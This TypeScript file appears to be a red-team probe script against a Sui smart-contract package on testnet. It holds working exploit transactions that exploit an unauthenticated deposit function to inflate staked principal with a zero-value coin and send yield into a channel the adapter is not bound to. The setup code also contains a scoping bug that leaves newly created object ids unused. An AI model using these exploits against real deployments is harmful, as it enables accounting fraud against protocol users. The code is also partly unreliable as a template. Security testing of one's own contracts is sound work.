/**
 * RED-TEAM ROUND 5 live probes vs package 0xce550b77… (testnet).
 * Free simulateTransaction for negative paths; paid txs only where state must persist.
 *
 * P1: scallop feed_harvested_yield_to_chat accepts a channel that is not the adapter's
 *     bound channel (channel_id never compared) — accounting cross-wire. [paid, persists]
 * P2: scallop deposit_to_scallop has NO auth and NO pairing: anyone mints Coin<SSUI>
 *     via sui::coin::zero (witness-free) and inflates total_staked_sui_principal by an
 *     arbitrary u64 with zero assets. [paid, persists]
 * P3: scallop split_ssui_for_redemption by non-admin → 7001. [simulate]
 */
import { Ed25519Keypair } from "@mysten/sui/keypairs/ed25519"
import { fromBase64 } from "@mysten/sui/utils"
import { SuiGrpcClient } from "@mysten/sui/grpc"
import { Transaction } from "@mysten/sui/transactions"
import { readFileSync } from "node:fs"
import { homedir } from "node:os"

const PKG = "0xce550b77f97866cb922834e4185585c61396ba953bacd27ee92f352b93cf9fc5"
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006"
const A1 = "0x2c6539e5802d1476dae4a7aada30265dd2568f198ecf2f184861ea7deb3f6347"
const A2 = "0x843f44a42e10a6dc701b7f60a4dedc544dc7910e971ee6a493f4d9096953e04e"

const grpc = new SuiGrpcClient({ network: "testnet", baseUrl: "https://fullnode.testnet.sui.io:443" })
// gRPC client satisfies the read surface Transaction.build probes at runtime; the declared
// type wants the JSON-RPC SuiClient, hence this single boundary cast.
const buildClient = grpc as unknown as never

function keypairFor(address: string): Ed25519Keypair {
  const ks = JSON.parse(readFileSync(`${homedir()}/.sui/sui_config/sui.keystore`, "utf8")) as string[]
  for (const entry of ks) {
    const kp = Ed25519Keypair.fromSecretKey(fromBase64(entry).slice(1))
    if (kp.toSuiAddress() === address) return kp
  }
  throw new Error(`no key for ${address}`)
}

const delay = (ms: number) => {
  let resolve!: () => void; const promise = new Promise<void>(res => { resolve = res })
  setTimeout(resolve, ms)
  return promise
}


interface RpcRecord { [k: string]: unknown }

function asRecord(v: unknown): RpcRecord {
  if (v && typeof v === 'object') return v as RpcRecord
  throw new Error('unexpected RPC shape')
}

function recordField(v: unknown, key: string): unknown {
  return asRecord(v)[key]
}

interface TxStatus { ok: boolean; digest?: string; err?: string }

async function execute(signer: Ed25519Keypair, tx: Transaction): Promise<TxStatus> {
  tx.setSender(signer.toSuiAddress())
  const bytes = await tx.build({ client: buildClient })
  const sig = await signer.signTransaction(bytes)
  const res = asRecord(await grpc.executeTransaction({
    transaction: bytes, signatures: [sig.signature], include: { effects: true, events: true },
  }))
  const t = recordField(res, 'Transaction') ?? recordField(res, 'FailedTransaction')
  if (t == null) return { ok: false, err: 'no Transaction envelope' }
  const statusObj = recordField(t, 'status')
  if (statusObj != null && recordField(statusObj, 'success') === true) {
    const d = recordField(t, 'digest')
    return { ok: true, digest: typeof d === 'string' ? d : String(recordField(d, 'digest') ?? '') }
  }
  const errObj = statusObj == null ? undefined : recordField(statusObj, 'error')
  const inner = errObj == null ? undefined : recordField(errObj, 'message')
  return { ok: false, err: String(inner ?? 'unknown').slice(0, 220) }
}

async function simulate(signer: Ed25519Keypair, tx: Transaction, label: string): Promise<void> {
  tx.setSender(signer.toSuiAddress())
  try {
    const bytes = await tx.build({ client: buildClient })
    const res = asRecord(await (grpc as any).simulateTransaction({ transaction: bytes }))
    const effects = recordField(res, 'effects')
    const statusObj = effects == null ? recordField(res, 'status') : recordField(effects, 'status')
    const simOk = statusObj == null
      ? recordField(res, 'status') === 'success'
      : recordField(statusObj, 'status') === 'success' || recordField(statusObj, 'success') === true
    const simErr = statusObj == null ? undefined : (recordField(statusObj, 'error') ?? statusObj)
    console.log(`[${label}] ${simOk ? 'SIM-SUCCESS ✅' : `ABORT ❌ ${String(simErr ?? 'unknown').slice(0, 180)}`}`)
  } catch (e) {
    const msg = String((e as Error)?.message ?? e)
    const m = /abort code: (\d+).*?([\w]+)::([\w]+)/.exec(msg)
    console.log(`[${label}] ABORT(code ${m?.[1] ?? '?'} @ ${m?.[3] ?? '?'}) ${msg.slice(0, 120)}`)
  }
}

interface FetchedTx { events?: unknown[]; objectTypes?: Record<string, string>; changed?: { objectId: string; idOperation?: string }[] }

async function fetchTx(digest: string): Promise<FetchedTx | null> {
  for (let i = 0; i < 10; i++) {
    try {
      const full = asRecord(await grpc.getTransaction({ digest, include: { events: true, effects: true, objectTypes: true } }))
      const t = recordField(full, 'Transaction') ?? full
      const events = recordField(t, 'events')
      const effects = recordField(t, 'effects')
      if (events != null || effects != null) {
        const changedRaw = effects == null ? [] : recordField(effects, 'changedObjects')
        const changed = Array.isArray(changedRaw) ? (changedRaw as { objectId: string; idOperation?: string }[]) : []
        const ot = recordField(t, 'objectTypes')
        return {
          events: Array.isArray(events) ? events : [],
          objectTypes: (ot && typeof ot === 'object' ? ot : {}) as Record<string, string>,
          changed: changed.map(c => ({ objectId: c.objectId, idOperation: c.idOperation })),
        }
      }
    } catch { /* not indexed yet */ }
    await delay(700)
  }
  return null
}

function eventBytes(e: unknown): Uint8Array {
  const bcs = recordField(e, 'bcs')
  if (bcs instanceof Uint8Array) return bcs
  if (bcs && typeof bcs === "object") return Uint8Array.from(Object.values(bcs as Record<string, number>) as number[])
  return new Uint8Array()
}

async function channelIdOf(digest: string): Promise<string> {
  const t = await fetchTx(digest)
  for (const e of t?.events ?? []) {
    const et = recordField(e, 'eventType')
    if (String(et ?? '').includes('ChannelCreatedWithStake')) {
      return "0x" + Buffer.from(eventBytes(e).slice(0, 32)).toString("hex")
    }
  }
  return ""
}

async function createdIdOf(digest: string, typeNeedle: string): Promise<string> {
  const t = await fetchTx(digest)
  if (!t) return ""
  for (const c of t.changed ?? []) {
    if (c.idOperation === "Created" && (t.objectTypes?.[c.objectId] ?? "").includes(typeNeedle)) return c.objectId
  }
  return ""
}

async function main() {
  const a1 = keypairFor(A1)
  const a2 = keypairFor(A2)
  const REUSE = process.env.RT5_REUSE === "1"
  let c1 = "0x78def48258f52c4c21929ceb1d5fbdede34a3bbe10a1b8456add0018ecb911a8"
  let c2 = "0x521a6abd3ec049156b454b61375a85be27e6c66fc97b322717aa173388dd9de3"
  let adA = "0x9947926aad22c62db4dbb6eeffb181f8d97e1476a1cb915d59125d6ef4dc698b"
  let adB = "0x29b4a7bd2ebbbe007ca87b87fd0a378d2cc75813b6bc132fe811266719787f46"
  if (REUSE) {
    // skip setup, use ids above
  } else {

  // ---- setup: c1 (creator A1, member A2), c2 (creator A2) ----
  const tx1 = new Transaction()
  const [coin1] = tx1.splitCoins(tx1.gas, [1_000_000n])
  tx1.moveCall({
    target: `${PKG}::onchain_chat::create_channel_with_stake`,
    arguments: [tx1.pure.address("0x0"), tx1.pure.vector("u8", Array.from(Buffer.from("rt5-c1"))), tx1.pure.vector("address", [A2]), coin1],
  })
  const r1 = await execute(a1, tx1)
  if (!r1.ok) return console.log("[setup c1] FAILED", r1.err)
  const c1 = await channelIdOf(r1.digest!)
  console.log("[setup] c1", c1, "tx", r1.digest)

  const tx2 = new Transaction()
  const [coin2] = tx2.splitCoins(tx2.gas, [1_000_000n])
  tx2.moveCall({
    target: `${PKG}::onchain_chat::create_channel_with_stake`,
    arguments: [tx2.pure.address("0x0"), tx2.pure.vector("u8", Array.from(Buffer.from("rt5-c2"))), tx2.pure.vector("address", []), coin2],
  })
  const r2 = await execute(a2, tx2)
  if (!r2.ok) return console.log("[setup c2] FAILED", r2.err)
  const c2 = await channelIdOf(r2.digest!)
  console.log("[setup] c2", c2, "tx", r2.digest)

  // ---- adapters: adA bound to c1 (admin A1); adB bound to c2 (admin A2) ----
  const txA = new Transaction()
  txA.moveCall({ target: `${PKG}::scallop_yield_adapter::create_scallop_adapter`, arguments: [txA.object(c1)] })
  const rA = await execute(a1, txA)
  if (!rA.ok) return console.log("[setup adA] FAILED", rA.err)
  const adA = await createdIdOf(rA.digest!, "ScallopVaultAdapter")
  console.log("[setup] adA", adA, "tx", rA.digest)

  const txB = new Transaction()
  txB.moveCall({ target: `${PKG}::scallop_yield_adapter::create_scallop_adapter`, arguments: [txB.object(c2)] })
  const rB = await execute(a2, txB)
  if (!rB.ok) return console.log("[setup adB] FAILED", rB.err)
  const adB = await createdIdOf(rB.digest!, "ScallopVaultAdapter")
  console.log("[setup] adB", adB, "tx", rB.digest)
  }

  // ---- P3 (simulate, free): non-admin split on adA → expect 7001 ----
  {
    const tx = new Transaction()
    const split = tx.moveCall({ target: `${PKG}::scallop_yield_adapter::split_ssui_for_redemption`, arguments: [tx.object(adA), tx.pure.u64(1n)] })
    tx.transferObjects([split], a2.toSuiAddress())
    await simulate(a2, tx, "P3 non-admin split_ssui(adA) expect 7001")
  }

  // ---- P2 (paid): A2 (not admin, not even bound-channel context) mints Coin<SSUI>=0
  //      via sui::coin::zero and "deposits" principal 1e12 MIST into adA ----
  {
    const tx = new Transaction()
    const zeroSsui = tx.moveCall({ target: "0x2::coin::zero", typeArguments: [`${PKG}::scallop_yield_adapter::SSUI`] })
    tx.moveCall({
      target: `${PKG}::scallop_yield_adapter::deposit_to_scallop`,
      arguments: [tx.object(adA), tx.pure.u64(1_000_000_000_000n), zeroSsui],
    })
    const r = await execute(a2, tx)
    console.log(`[P2 unauth deposit_to_scallop(adA, 1e12 MIST, zero-coin)] ${r.ok ? `EXECUTED ✅ tx ${r.digest}` : `FAILED ❌ ${r.err}`}`)
  }

  // ---- P1 (paid): A2 feeds 0.001 SUI "yield" through adA (bound to c1) into c2 ----
  {
    const tx = new Transaction()
    const [yc] = tx.splitCoins(tx.gas, [1_000_000n])
    tx.moveCall({
      target: `${PKG}::scallop_yield_adapter::feed_harvested_yield_to_chat`,
      arguments: [tx.object(adA), tx.object(c2), yc],
    })
    const r = await execute(a2, tx)
    console.log(`[P1 feed adA(c1-bound) → c2 mismatch] ${r.ok ? `EXECUTED ✅ tx ${r.digest}` : `FAILED ❌ ${r.err}`}`)
  }

  // ---- post-state read: adapter A accounting now inflated / cross-wired ----
  {
    const objRes = asRecord(await grpc.getObject({ objectId: adA, include: { content: true } }))
    const object = recordField(objRes, 'object')
    const content = object == null ? undefined : recordField(object, 'content')
    const b = content instanceof Uint8Array ? content : Uint8Array.from(Object.values((content ?? {}) as Record<string, number>) as number[])
    console.log("[post] adA raw BCS len", b.length, "hex", Buffer.from(b).toString("hex").slice(0, 160))
  }

  console.log("=== done ===")
}

main().catch(e => { console.error("FATAL", e); process.exit(1) })
